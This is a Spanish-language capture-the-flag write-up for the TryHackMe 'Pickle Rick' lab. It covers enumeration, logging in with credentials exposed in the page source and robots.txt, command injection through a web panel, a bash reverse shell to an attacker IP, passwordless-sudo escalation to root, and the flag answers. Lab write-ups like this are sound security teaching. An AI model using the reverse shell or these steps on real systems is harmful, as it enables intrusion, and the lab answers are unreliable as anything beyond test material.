# Write-up: 

- **Nombre de la m치quina:** `Pickle Rick` 
- **Plataforma:** `TryHackMe` 
- **IP:** `10.10.190.178` 
- **SO:** `Linux` 
- **Dificultad:** `Easy`

---

## 1. RECONOCIMIENTO

El objetivo de esta fase es identificar los puntos de entrada y servicios expuestos en la m치quina v칤ctima.

#### 1.1. Verificaci칩n de Conectividad

Se lanza un `ping` para confirmar que la m치quina est치 activa y obtener el TTL lo que puede darnos una primera pista sobre el sistema operativo.
```
	ping 10.10.243.209
```
Nos devuelve conectividad y un TTL=63 por lo que estamos ante una m치quina Linux.

![](Imagenes/25.png)


#### 1.2. Escaneo de Puertos

Se realiza un escaneo con **Nmap** para descubrir puertos abiertos, los servicios que corren en ellos y sus versiones.


```
sudo nmap -p- -sV -sC -sS --min-rate 5000 --open -n -Pn 10.10.243.209 -oN port_scan.txt
```

**Puertos Descubiertos:**

| Puerto | Servicio | Versi칩n    | Notas          맢
| ------ | -------- | ------------- | ------------------------ |
| 22   | ssh   맢 OpenSSH 8.2  | Necesitamos credenciales |
| 80   | http   | Apache 2.4.41 | Iniciaremos por aqu칤   |

![](Imagenes/26.png)

Normalmente el acceso por el puerto 22 al servicio ssh requiere de credenciales. Ya sea usuario y contrase침a o clave rsa. En este caso carecemos de informaci칩n al respecto as칤 que lo m치s productivo es explorar el puerto :80

---

## 2. ENUMERACI칍N

Una vez identificados los servicios, se procede a investigarlos en profundidad en busca de vulnerabilidades o informaci칩n 칰til.

### Puerto 80 ( HTTP)

#### Enumeraci칩n Manual:

- **Navegaci칩n web:** Se visita el sitio en `http://10.10.243.209.
  Tenemos esta p치gina donde Rick nos pide que encontremos 3 ingredientes para elaborar una poci칩n y dejar de ser un pepinillo. Ser치n nuestras flags.
  
  
 ![](Imagenes/27.png)
- **An치lisis del c칩digo fuente:** Se revisa el HTML en busca de comentarios, rutas o scripts ocultos.

  
  Nos dan el nombre de un usuario `R1ckRul3s`:
	
  
  ![](Imagenes/28.png)
- **Archivos comunes:** Se buscan manualmente archivos y directorios comunes:
	-  `/robots.txt`--> V`Wubbalubbadubdub`
 	-  `/sitemap.xml`--> X
  	-  `/login`--> X
  	-  `/admin`--> X
  	-  `/panel`--> X
  	-  `/user`--> X
  	-  `/panel`--> X
  	-  `backup`--> X
  	-  `uploads`--> x
  	-  `/assets` --> V
  	-  `test, etc.`--> X
  
  
- Encontramos informaci칩n en uno de los directorios :
	- `/robots.txt`--> `Wubbalubbadubdub`. Que de primeras no se si es algo relevante.
 	- `/assets`--> 맋onde vemos un Directory listing.
 
  
   ![](Imagenes/29.png)
#### Enumeraci칩n Autom치tica:

- Lanzamos la herramienta `whatweb` para que nos de informaci칩n sobre la aplicaci칩n web.  
```
whatweb 10.10.243.209
```

![](Imagenes/30.png)

Vemos versi칩n de Apache 2.4.41.


- Lanzamos la herramienta de enumeraci칩n `gobuster` para buscar directorios ocultos y extensiones .php,.txt y .html 


```
gobuster dir -u http://10.10.190.178/ -w /urs/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html -k
```

![](Imagenes/31.png)

**Hallazgos:**

- Vemos rutas llamativas que no hayamos encontrado en la enumeraci칩n manual:
  - `/login.php`--> podemos ver un panel de login
  ![](Imagenes/32.png)
 
#### Comprobaci칩n de credenciales:

 Utilizamos las potenciales credenciales para logearnos:
- Username : `R1ckRul3s`
- Password: `Wubbalubbadubdub`

Las credenciales son correctas. Nos dan acceso a lo que parece un **panel de comandos.** Y otras seccionales (potions) a las que no tenemos acceso como `R1ckRul3s` 

#### Comprobaci칩n de 맜ulnerabilidad RCE

1. Ejecutamos el comando `whoami` y nos devuelve que usuarios somos. 
2. Demuestra que tenemos una vulnerabilidad de `ejecuci칩n remota de comandos` `RCE`
![](Imagenes/33.png)


---

## 3. EXPLOTACI칍N

### 3.1 Acceso inicial:

1. Levantamos un puerto de escucha con `nectcat` en nuestra terminal por ejemplo el 5555:

```
sudo nc -nvlp 5555
```


2. Generamos un c칩digo malicioso con revershell y lo encapsulamos con `-c` : 

 ![](Imagenes/34.png)


```
bash -c 'bash -i >& /dev/tcp/10.9.3.10/5555 0>&1'
```

3. Teniendo el puerto en escucha, ejecutamos el c칩digo en la terminal. D치ndonos el acceso inicial en nuestra Kali. 
 ![](Imagenes/35.png)
 ![](Imagenes/36.png)
 
 

### Estabilizaci칩n de la TTY:
Buscamos una shell que pueda interactuar de forma correcta en la terminal. 


```
script /dev/null -c bash
```

Enviamos segundo plano :
  Control +Z


```
stty raw -echo; fg
```
```
reset xterm
```
```
export SHELL=bash
```
```
export TERM=xterm
```

![](Imagenes/37.png)



---

## 4. ESCALADA DE PRIVILEGIOS

Una vez dentro, el objetivo es elevar los privilegios del usuario actual al de `root`.

### 4.1. Enumeraci칩n Interna

Se realizan comprobaciones b치sicas y se buscan posibles vectores de escalada.

#### Comprobaciones del sistema:

쯈u칠 usuario somos?
`whoami`

![](Imagenes/38.png)


쮸 qu칠 grupo pertenezco?
`id` 

![](Imagenes/39.png)

쯈u칠 usuario hay en el sistema?
`cd home` y `ls`


![](Imagenes/40.png)


 
먝쯈u칠 usuario tienen una shell asignada?  `cat /etc/passwd | grep sh`

![](Imagenes/41.png)

Revisamos los directorios de los usuarios:

`www-data` :

![](Imagenes/42.png)

`ubuntu`: 

![](Imagenes/43.png)


`rick`:

![](Imagenes/44.png)

- **Hallazgos**:
  
	- En el directorio de `www-data` tenemos el primer ingrediente: `mr. meeseek kair`
	- En el directorio de `rick` tenemos una de las banderas, el segundo ingrediente. 
  `1 jerry tear`
  
Una buena pr치ctica ser칤a revisar los comandos utilizados por los usuarios en el `history`
#### B칰squeda del Vector de Escalada:


- **Permisos Sudo:** 쯈u칠 comandos podemos ejecutar como otro usuario (o `root`)?
  ```
  sudo -l
  ```
  ![](Imagenes/45.png)

  
  Vemos que como usuario `www-data` podemos ejecutar como sudo todos los comandos sin contrase침a.
  


### 4.2. Explotaci칩n y Escalada a Root


Por este motivo utilizamos simplemente el comando :
```
	sudo su
```

![](Imagenes/46.png)

Y nos convertimos en usuarios `root`

**Verificaci칩n:**

```
whoami
```

![](Imagenes/47.png)

SOMOS ROOT 游


---

## 5. CAPTURA DE BANDERAS (FLAGS)

Con acceso privilegiado, se buscan y leen las banderas.

#### Bandera de www-data ()


La hab칤a visto durante la enumeraci칩n del usuario por defecto `www-data`

- **Ubicaci칩n:** `/var/www/html/Sup3rS3cretPickl3Ingred.txt`
  
- **Contenido:** `mr. meeseek hair`

![](Imagenes/48.png)

#### Bandera de Rick (second ingredients.txt)

La hab칤a visto durante la enumeraci칩n del usuario `Rick`
- **Ubicaci칩n:** `/rick/second ingredients.txt`
  
- **Contenido:** `1 jerry tear`

  
![](Imagenes/44.png)

#### Bandera de Root (3rd.txt)


```
find  / -name root.txt 2>/dev/null
```

- **Ubicaci칩n:** ` /root/3rd.txt`
  
- **Contenido:** `fleeb juice`

![](Imagenes/49.png)

